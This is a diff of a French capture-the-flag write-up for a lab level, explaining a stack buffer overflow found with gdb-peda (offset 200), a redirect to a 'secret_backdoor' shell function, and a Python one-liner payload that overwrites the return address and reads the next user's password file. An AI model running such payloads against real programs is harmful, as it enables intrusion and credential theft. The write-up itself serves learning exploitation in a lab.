@@ -1,5 +1,8 @@
 # Level 09
 
+- On peut overflow la deuxieme entrée
+- On calcule donc l'offset pour pouvoir ecrire par dessus la Return Address
+- La longueur de se qui sera copier est controlé par l'un des caractere de l'username donc on y met que la plus grande valeur \xff
 <pre>
 gdb-peda$ pattern create 300
 'AAA%AAsAABAA$AAnAACAA-AA(AADA...'
@@ -25,13 +28,13 @@ Stopped reason: SIGSEGV
 gdb-peda$ pattern offset AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%
 <strong>AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A% found at offset: 200</strong>
 </pre>
-
+- On recupere l'addresse de la fonction secret_backdoor qui contien l'execution d'un "shell"
 <pre>
 (gdb) disass secret_backdoor 
 Dump of assembler code for function secret_backdoor:
    0x000055555555488c <+0>:     push   %rbp
 </pre>
-
+- Il ne reste plus qu'a executé la commande qui va rediriger vers secret_backdoor
 ```
-$ (python -c "print('\xff' * 120)"; python -c "import struct; print('A' * 200 + struct.pack('<q', 0x55555555488c))"; echo 'cat /home/users/end/.pass' ) | ./level09
+(python -c "print('\xff' * 120)"; python -c "import struct; print('A' * 200 + struct.pack('<q', 0x55555555488c))"; echo 'cat /home/users/end/.pass' ) | ./level09
 ```
